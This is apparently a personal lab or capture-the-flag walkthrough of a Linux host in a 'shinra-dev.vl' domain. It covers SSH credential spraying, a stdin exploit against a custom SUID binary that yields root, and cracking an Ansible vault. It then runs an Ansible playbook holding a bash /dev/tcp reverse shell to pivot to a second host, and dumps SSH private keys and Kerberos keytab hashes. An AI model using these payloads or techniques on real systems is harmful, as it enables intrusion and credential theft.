The initial UDP scan shows the following:

```bash
└─$ nmap -F -sU 172.16.11.70
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-20 14:46 +0100
Nmap scan report for 172.16.11.70
Host is up (0.00040s latency).
All 100 scanned ports on 172.16.11.70 are in ignored states.
Not shown: 100 open|filtered udp ports (no-response)

Nmap done: 1 IP address (1 host up) scanned in 2.41 seconds

```

Where instead the TCP scan shows much more informations:

```bash
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 2d:23:b6:9f:42:28:36:70:cc:1e:c3:23:f3:d3:7b:e4 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOuUPCuFbcDeJEc941lEUAr9a1k+4V+NT4he8tySE2j7
8220/tcp open  http    syn-ack ttl 64 Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: 3Com Baseline Switch 2924-SFP or Cisco ESW-520 switch or Allied Telesis AT-8000 series switch (86%), Allied Telesis AT-8000S; Dell PowerConnect 2824, 3448, 5316M, or 5324; Linksys SFE2000P, SRW2024, SRW2048, or SRW224G4; or TP-LINK TL-SL3428 switch (86%), Aruba, Cisco, or Netgear switch (Linux 3.10 or 4.4) (86%), Linksys SRW2008MP switch (86%), Cisco SG 300-10, Dell PowerConnect 2748, Linksys SLM2024, SLM2048, or SLM224P, or Netgear FS728TP or GS724TP switch (86%), Linksys SRW2000-series or Allied Telesyn AT-8000S switch (86%), IBM z/OS 1.12 (85%), Cisco SRW2008-K9 switch (85%), OpenBSD 5.5 (85%)
No exact OS matches for host (test conditions non-ideal).

```

# SSH

Here I was able to understand that the current user I have access to this server, now it should be a low-privileged user but it is worth trying:

```bash
└─$ netexec ssh 11_hosts.txt -u william.davis@shinra-dev.vl -p Eniwy7j5KH+oze 
SSH         172.16.11.11    22     172.16.11.11     [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.13
SSH         172.16.11.71    22     172.16.11.71     [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.13
SSH         172.16.11.70    22     172.16.11.70     [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.13
SSH         172.16.11.13    22     172.16.11.13     [*] SSH-2.0-OpenSSH_for_Windows_8.1
SSH         172.16.11.25    22     172.16.11.25     [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.13
SSH         172.16.11.11    22     172.16.11.11     [-] william.davis@shinra-dev.vl:Eniwy7j5KH+oze
SSH         172.16.11.71    22     172.16.11.71     [+] william.davis@shinra-dev.vl:Eniwy7j5KH+oze  Linux - Shell access!
SSH         172.16.11.70    22     172.16.11.70     [+] william.davis@shinra-dev.vl:Eniwy7j5KH+oze  Linux - Shell access!
SSH         172.16.11.13    22     172.16.11.13     [-] william.davis@shinra-dev.vl:Eniwy7j5KH+oze
SSH         172.16.11.25    22     172.16.11.25     [-] william.davis@shinra-dev.vl:Eniwy7j5KH+oze

```

In the meantime, I will execute Linpeas and check only the interesting stuff here, now here I notced that there is a user that is custom:

![f7b29239807ddb0e4d27e33c9a655a4b.png](../../../_resources/f7b29239807ddb0e4d27e33c9a655a4b.png)

Now something I totally missed is that custom SUID binary:

```bash
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid
-rwsr-xr-x 1 root root 84K Nov 29  2022 /snap/core20/1778/usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 52K Nov 29  2022 /snap/core20/1778/usr/bin/chsh
-rwsr-xr-x 1 root root 87K Nov 29  2022 /snap/core20/1778/usr/bin/gpasswd
-rwsr-xr-x 1 root root 55K Feb  7  2022 /snap/core20/1778/usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 44K Nov 29  2022 /snap/core20/1778/usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 67K Nov 29  2022 /snap/core20/1778/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 67K Feb  7  2022 /snap/core20/1778/usr/bin/su
-rwsr-xr-x 1 root root 163K Jan 19  2021 /snap/core20/1778/usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 39K Feb  7  2022 /snap/core20/1778/usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-- 1 root systemd-resolve 51K Oct 25  2022 /snap/core20/1778/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 463K Mar 30  2022 /snap/core20/1778/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 84K Mar 14  2022 /snap/core20/1738/usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 52K Mar 14  2022 /snap/core20/1738/usr/bin/chsh
-rwsr-xr-x 1 root root 87K Mar 14  2022 /snap/core20/1738/usr/bin/gpasswd
-rwsr-xr-x 1 root root 55K Feb  7  2022 /snap/core20/1738/usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 44K Mar 14  2022 /snap/core20/1738/usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 67K Mar 14  2022 /snap/core20/1738/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 67K Feb  7  2022 /snap/core20/1738/usr/bin/su
-rwsr-xr-x 1 root root 163K Jan 19  2021 /snap/core20/1738/usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 39K Feb  7  2022 /snap/core20/1738/usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-- 1 root systemd-resolve 51K Oct 25  2022 /snap/core20/1738/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 463K Mar 30  2022 /snap/core20/1738/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 121K Nov 25  2022 /snap/snapd/17883/usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwsr-xr-x 1 root root 177K Apr  5  2025 /snap/snapd/24505/usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwsr-xr-x 1 root root 19K Feb 26  2022 /usr/libexec/polkit-agent-helper-1
-rwsr-xr-x 1 root root 59K Feb  6  2024 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 35K Mar 23  2022 /usr/bin/fusermount3
-rwsr-xr-x 1 root root 35K Apr  9  2024 /usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 47K Apr  9  2024 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 17K Dec 18  2022 /usr/bin/elevate (Unknown SUID binary!)
-rwsr-xr-x 1 root root 40K Feb  6  2024 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 44K Feb  6  2024 /usr/bin/chsh
-rwsr-xr-x 1 root root 227K Apr  3  2023 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 72K Feb  6  2024 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 71K Feb  6  2024 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 55K Apr  9  2024 /usr/bin/su
-rwsr-xr-x 1 root root 31K Feb 26  2022 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)/Generic_CVE-2021-4034
-rwsr-xr-x 1 root root 331K Apr 11  2025 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 148K Jan 15  2025 /usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwsr-xr-- 1 root messagebus 35K Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper


```

And It should elevate me to root?

```bash
/lib64/ld-linux-x86-64.so.2
zreO
__gmon_start__
_ITM_deregisterTMCloneTable
_ITM_registerTMCloneTable
HMAC_Init_ex
HMAC_Update
HMAC_CTX_new
EVP_sha1
HMAC_Final
fgets
puts
setgid
setuid
gettimeofday
fopen
system
strlen
__libc_start_main
__cxa_finalize
sprintf
fclose
__isoc99_scanf
strcmp
libcrypto.so.3
libc.so.6
OPENSSL_3.0.0
GLIBC_2.34
GLIBC_2.7
GLIBC_2.2.5
PTE1
u+UH
/root/secret
Correct code, elevating..
/bin/bash
Wrong Code.
;*3$"
GCC: (Debian 12.2.0-9) 12.2.0

```

# Getting the root

Now I downloaded and scannwd the binary in Binary Ninja and this is the main function:

```bash
00401239    int32_t main(int32_t argc, char** argv, char** envp)

0040124f        setuid(uid: 0)
0040125e        setgid(gid: 0)
00401277        FILE* fp = fopen(filename: "/root/secret", mode: "r")
00401293        char buf[0x20c]
00401293        fgets(&buf, n: 0x200, fp)
0040129f        fclose(fp)
004012a4        int64_t rax_3 = HMAC_CTX_new()
004012ad        int64_t rax_4 = EVP_sha1()
004012dd        HMAC_Init_ex(rax_3, &buf, zx.q(strlen(&buf)), rax_4, 0)
004012f1        struct timeval var_258
004012f1        gettimeofday(&var_258, nullptr)
0040131c        int32_t rax_11 = (var_258.tv_sec s/ 0x1e).d
00401328        uint8_t var_260 = (rax_11 u>> 0x18).b
00401334        uint8_t var_25f = (rax_11 u>> 0x10).b
00401340        uint8_t var_25e = (rax_11 u>> 8).b
00401349        char var_25d = rax_11.b
0040134f        char var_25c = 0
00401356        char var_25b = 0
0040135d        char var_25a = 0
00401364        char var_259 = 0
00401381        HMAC_Update(rax_3, &var_260, 8, &var_260)
0040139c        char var_278[0x13]
0040139c        HMAC_Final(rax_3, &var_278, 0, &var_278)
004013ab        char var_265
004013ab        int32_t rax_23 = zx.d(var_265) & 0xf
00401419        int32_t var_3c = 0xcafebabe
0040143c        char s[0x10]
0040143c        sprintf(&s, format: "%u", 
0040143c            (zx.q(var_278[sx.q(rax_23 + 3)]) | zx.q(zx.d(var_278[sx.q(rax_23)]) << 0x18)
0040143c                | zx.q(zx.d(var_278[sx.q(rax_23 + 1)]) << 0x10)
0040143c                | zx.q(zx.d(var_278[sx.q(rax_23 + 2)]) << 8)) & 0x7fffffff, 
0040143c            &data_402013)
0040145a        char var_298[0x10]
0040145a        __isoc99_scanf(format: "%s", &var_298)
0040145a        
0040147a        if (strcmp(&var_298, &s) != 0)
004014a6            puts(str: "Wrong Code.")
0040147a        else
00401486            puts(str: "Correct code, elevating..")
00401495            system(line: "/bin/bash")
00401495        
004014b5        return 0

```

it is basically checking a TOPT so i asked Gemini to provide me a exploit since i don't like reversing stuff nor I understand a damn about it. Here I had to ask for a nudge but basically this is it:

```bash
william.davis@shinra-dev.vl@prov:/usr/bin$ cat <(python3 -c 'print("ABCDEFGHI\x00ZZZZZZABCDEFGHI\x00")') - | /usr/bin/elevate 
Correct code, elevating..
id
uid=0(root) gid=0(root) groups=0(root),1492400513(domain users@shinra-dev.vl),1492401119(it@shinra-dev.vl)



```

Now I see that the flag is saved within the Ansible vault:

```bash
flag.yml  secret  snap
ls -al
total 56
drwx------  8 root root 4096 Mar 23 03:49 .
drwxr-xr-x 20 root root 4096 Mar 23 14:34 ..
drwxr-xr-x  4 root root 4096 Dec  9  2022 .ansible
lrwxrwxrwx  1 root root    9 Mar 23 03:49 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc
drwx------  2 root root 4096 Dec 18  2022 .cache
-rw-------  1 root root  484 Jun  2  2025 flag.yml
drwx------  3 root root 4096 Dec  9  2022 .launchpadlib
-rw-------  1 root root   20 Dec 26  2022 .lesshst
drwxr-xr-x  3 root root 4096 Dec  6  2022 .local
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
-rw-r--r--  1 root root   33 Dec 18  2022 secret
-rw-r--r--  1 root root   66 Dec 26  2022 .selected_editor
drwx------  3 root root 4096 Dec  6  2022 snap
drwx------  2 root root 4096 Dec 18  2022 .ssh
-rw-r--r--  1 root root    0 Dec 26  2022 .sudo_as_admin_successful
cat secret
b285fe3018ad3f761d852d5df23af730
cat flag.yml
$ANSIBLE_VAULT;1.1;AES256
32393435366534336563306364633232303364356531333935623036663031303935626666343330
3162653539623466373937613433363964323966363561620a353264323430343035346563623633
30653561656534613366386134646564356464363130636461663537643434323561396138396561
3761353933656339360a303937363633356638386133383738626431616133653566633864356637
37626265633866393431636532363436333239653862396365616138616566653734366337306431
3861643130633639653862303433333134306238656133613263
cd .ssh
ls -al 
total 24
drwx------ 2 root root 4096 Dec 18  2022 .
drwx------ 8 root root 4096 Mar 23 03:49 ..
-rw------- 1 root root   91 Dec 18  2022 authorized_keys
-rw------- 1 root root 1956 Dec 18  2022 known_hosts
-rw------- 1 root root  399 Dec 18  2022 prov
-rw------- 1 root root  399 Dec 18  2022 registry


```

But it is password protectedf which means I need to crack it:

```bash
ls
flag.yml  secret  snap
 ansible-playbook --ask-vault-password flag.yml            
Vault password: 
[WARNING]: Error in vault password prompt (default): Invalid vault password was provided
ERROR! Invalid vault password was provided
/bin/bash: line 15: b285fe3018ad3f761d852d5df23af730: command not found
/bin/bash: line 16: b285fe3018ad3f761d852d5df23af730: command not found



```

And I have the credentials:

```bash
e$0*0*29456e43ec0cdc2203d5e1395b06f01095bff4301be59b4f797a4369d29f65ab*0976635f88a3878bd1aa3e5fc8d5f77bbec8f941ce2646329e8b9ceaa8aefe746c70d18ad10c69e8b0433140b8ea3a2c*52d2404054ecb630e5aee4a3f8a4ded5dd610cdaf57d4425a9a89ea7a593ec96:gilgamesh
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 16900 (Ansible Vault)
Hash.Target......: $ansible$0*0*29456e43ec0cdc2203d5e1395b06f01095bff4...93ec96
Time.Started.....: Mon Mar 23 16:54:05 2026 (1 sec)
Time.Estimated...: Mon Mar 23 16:54:06 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (Wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:    61238 H/s (12.24ms) @ Accel:8 Loops:250 Thr:256 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 98304/14344385 (0.69%)
Rejected.........: 0/98304 (0.00%)
Restore.Point....: 65536/14344385 (0.46%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:9750-9999
Candidate.Engine.: Device Generator
Candidates.#01...: ryanscott -> Donovan
Hardware.Mon.#01.: Temp: 53c Util: 97% Core:1620MHz Mem:5000MHz Bus:8

Started: Mon Mar 23 16:53:53 2026
Stopped: Mon Mar 23 16:54:08 2026
user@user-host:~/Downloads$ 

```

And I have the secret:

```bash
flag.yml  secret  snap
echo "gilgamesh" > .vault_pass
ls
flag.yml  secret  snap
ls -al
total 60
drwx------  8 root root 4096 Mar 23 15:58 .
drwxr-xr-x 20 root root 4096 Mar 23 14:34 ..
drwxr-xr-x  4 root root 4096 Dec  9  2022 .ansible
lrwxrwxrwx  1 root root    9 Mar 23 03:49 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc
drwx------  2 root root 4096 Dec 18  2022 .cache
-rw-------  1 root root  484 Jun  2  2025 flag.yml
drwx------  3 root root 4096 Dec  9  2022 .launchpadlib
-rw-------  1 root root   20 Dec 26  2022 .lesshst
drwxr-xr-x  3 root root 4096 Dec  6  2022 .local
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
-rw-r--r--  1 root root   33 Dec 18  2022 secret
-rw-r--r--  1 root root   66 Dec 26  2022 .selected_editor
drwx------  3 root root 4096 Dec  6  2022 snap
drwx------  2 root root 4096 Dec 18  2022 .ssh
-rw-r--r--  1 root root    0 Dec 26  2022 .sudo_as_admin_successful
-rw-r--r--  1 root root   10 Mar 23 15:58 .vault_pass
cat .vault_pass
gilgamesh


ansible-vault view --vault-password-file .vault_pass flag.yml
SHINRA{1001fda21794435ad70316a33b0e4c05}
```

Here I can see the SSH private key for this machine:

```bash
cat prov
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACD18R7/ATKInaCmqTnDojEVkNO5E4r2Eg6gFNQh/7D5xwAAAJA8uZPCPLmT
wgAAAAtzc2gtZWQyNTUxOQAAACD18R7/ATKInaCmqTnDojEVkNO5E4r2Eg6gFNQh/7D5xw
AAAECSEnOfifsUsZHJKQnxfuQasMzrPA9EHYJsQZlA3xnfw/XxHv8BMoidoKapOcOiMRWQ
07kTivYSDqAU1CH/sPnHAAAACXJvb3RAcHJvdgECAwQ=
-----END OPENSSH PRIVATE KEY-----
```

Now I need to obtain a RCE on the registry machine where Gitea is installed, for that case I can double check that the machine is in inventory:

```bash
ansible all --list-hosts
  hosts (2):
    registry
    prov
```

I used this payload to get a rce back to the Pivot machine:

```bash
cat rce.yml 
- hosts: registry
  tasks:
  - name: rev
    shell: bash -c 'bash -i >& /dev/tcp/172.16.11.20/4444 0>&1'


ansible-playbook -i /etc/ansible/hosts -l registry rce.yml

PLAY [registry] ***********************************************************************************************************************************************

TASK [Gathering Facts] ****************************************************************************************************************************************
ok: [registry]

TASK [rev] ****************************************************************************************************************************************************



```

And now I have the private SSH key:

```bash
root@web01:/tmp# nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 172.16.11.71 54860
root@registry:~# id 
id
uid=0(root) gid=0(root) groups=0(root)
root@registry:~# id
id
uid=0(root) gid=0(root) groups=0(root)
root@registry:~# cd root
cd root
bash: cd: root: No such file or directory
root@registry:~# ls
ls
flag.txt
snap
verdaccio
root@registry:~# ls -al
ls -al
total 60
drwx------  9 root root 4096 Mar 23 03:48 .
drwxr-xr-x 20 root root 4096 Mar 23 14:34 ..
drwx------  3 root root 4096 Dec 18  2022 .ansible
lrwxrwxrwx  1 root root    9 Mar 23 03:48 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc
drwx------  2 root root 4096 Dec 18  2022 .cache
-rw-r--r--  1 root root   41 Jun  2  2025 flag.txt
-rw-------  1 root root   20 Dec 18  2022 .lesshst
drwxr-xr-x  3 root root 4096 Dec  6  2022 .local
-rw-------  1 root root  203 Dec 18  2022 .mysql_history
drwxr-xr-x  4 root root 4096 Dec 18  2022 .npm
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
-rw-r--r--  1 root root   66 Dec 26  2022 .selected_editor
drwx------  3 root root 4096 Dec  6  2022 snap
drwx------  2 root root 4096 Dec 18  2022 .ssh
-rw-r--r--  1 root root    0 Dec 18  2022 .sudo_as_admin_successful
drwxr-x---  5 root root 4096 Jan  8  2023 verdaccio
root@registry:~# cd .ssh
cd .ssh
root@registry:~/.ssh# ls
ls
authorized_keys
id_ed25519
id_ed25519.pub
root@registry:~/.ssh# cat id_ed25519
cat id_ed25519
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACBY+TqhT/yw8sXww4fmT5HtRopsPYesx3xuXwxhPK+2owAAAJBm22ycZtts
nAAAAAtzc2gtZWQyNTUxOQAAACBY+TqhT/yw8sXww4fmT5HtRopsPYesx3xuXwxhPK+2ow
AAAEA43GKTfhYmInDdPn9Kv5w3e8ESNn4R4a1RpVNcimsYWVj5OqFP/LDyxfDDh+ZPke1G
imw9h6zHfG5fDGE8r7ajAAAADXJvb3RAcmVnaXN0cnk=
-----END OPENSSH PRIVATE KEY-----

```

I will also export the credentials of this machine from the keytab file:

```bash
BQIAAAA5AAEADVNISU5SQS1ERVYuVkwABVBST1YkAAAAAWgb/FAIABcAEFkP+acS4LYbbjAGZDhLYIEAAAAIAAAAOQABAA1TSElOUkEtREVWLlZMAAVQUk9WJAAAAAFoG/xQCAARABAQiAq0EsmcwxirjPb9MGy/AAAACAAAAEkAAQANU0hJTlJBLURFVi5WTAAFUFJPViQAAAABaBv8UAgAEgAgND6/GNCBMu8fKfu2x0Ch8s811VG457x1nPUOXIwf3RoAAAAIAAAAPgACAA1TSElOUkEtREVWLlZMAARob3N0AARQUk9WAAAAAWgb/FAIABcAEFkP+acS4LYbbjAGZDhLYIEAAAAIAAAAPgACAA1TSElOUkEtREVWLlZMAARob3N0AARQUk9WAAAAAWgb/FAIABEAEBCICrQSyZzDGKuM9v0wbL8AAAAIAAAATgACAA1TSElOUkEtREVWLlZMAARob3N0AARQUk9WAAAAAWgb/FAIABIAIDQ+vxjQgTLvHyn7tsdAofLPNdVRuOe8dZz1DlyMH90aAAAACAAAAEsAAgANU0hJTlJBLURFVi5WTAARUmVzdHJpY3RlZEtyYkhvc3QABFBST1YAAAABaBv8UAgAFwAQWQ/5pxLgthtuMAZkOEtggQAAAAgAAABLAAIADVNISU5SQS1ERVYuVkwAEVJlc3RyaWN0ZWRLcmJIb3N0AARQUk9WAAAAAWgb/FAIABEAEBCICrQSyZzDGKuM9v0wbL8AAAAIAAAAWwACAA1TSElOUkEtREVWLlZMABFSZXN0cmljdGVkS3JiSG9zdAAEUFJPVgAAAAFoG/xQCAASACA0Pr8Y0IEy7x8p+7bHQKHyzzXVUbjnvHWc9Q5cjB/dGgAAAAgAAAA5AAEADVNISU5SQS1ERVYuVkwABVBST1YkAAAAAWhGfWEJABcAEJAqsHuzEUSr6F9EftnmXI4AAAAJAAAAOQABAA1TSElOUkEtREVWLlZMAAVQUk9WJAAAAAFoRn1hCQARABCSX3FXqPl15SurxdpWv8qrAAAACQAAAEkAAQANU0hJTlJBLURFVi5WTAAFUFJPViQAAAABaEZ9YQkAEgAgwIDm+UBTkEP9n6R0GvaY3uKS8jNwkrASMt17SqlSwyEAAAAJAAAAPgACAA1TSElOUkEtREVWLlZMAARob3N0AARQUk9WAAAAAWhGfWEJABcAEJAqsHuzEUSr6F9EftnmXI4AAAAJAAAAPgACAA1TSElOUkEtREVWLlZMAARob3N0AARQUk9WAAAAAWhGfWEJABEAEJJfcVeo+XXlK6vF2la/yqsAAAAJAAAATgACAA1TSElOUkEtREVWLlZMAARob3N0AARQUk9WAAAAAWhGfWEJABIAIMCA5vlAU5BD/Z+kdBr2mN7ikvIzcJKwEjLde0qpUsMhAAAACQAAAEsAAgANU0hJTlJBLURFVi5WTAARUmVzdHJpY3RlZEtyYkhvc3QABFBST1YAAAABaEZ9YQkAFwAQkCqwe7MRRKvoX0R+2eZcjgAAAAkAAABLAAIADVNISU5SQS1ERVYuVkwAEVJlc3RyaWN0ZWRLcmJIb3N0AARQUk9WAAAAAWhGfWEJABEAEJJfcVeo+XXlK6vF2la/yqsAAAAJAAAAWwACAA1TSElOUkEtREVWLlZMABFSZXN0cmljdGVkS3JiSG9zdAAEUFJPVgAAAAFoRn1hCQASACDAgOb5QFOQQ/2fpHQa9pje4pLyM3CSsBIy3XtKqVLDIQAAAAk=
```

```bash
─$ python3 ../Tools/KeyTabExtract/keytabextract.py krb5_prov.keytab 
[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
[+] Keytab File successfully imported.
    REALM : SHINRA-DEV.VL
    SERVICE PRINCIPAL : PROV$/
    NTLM HASH : 590ff9a712e0b61b6e300664384b6081
    AES-256 HASH : 343ebf18d08132ef1f29fbb6c740a1f2cf35d551b8e7bc759cf50e5c8c1fdd1a
    AES-128 HASH : 10880ab412c99cc318ab8cf6fd306cbf

```

I will move to the GItTea machine.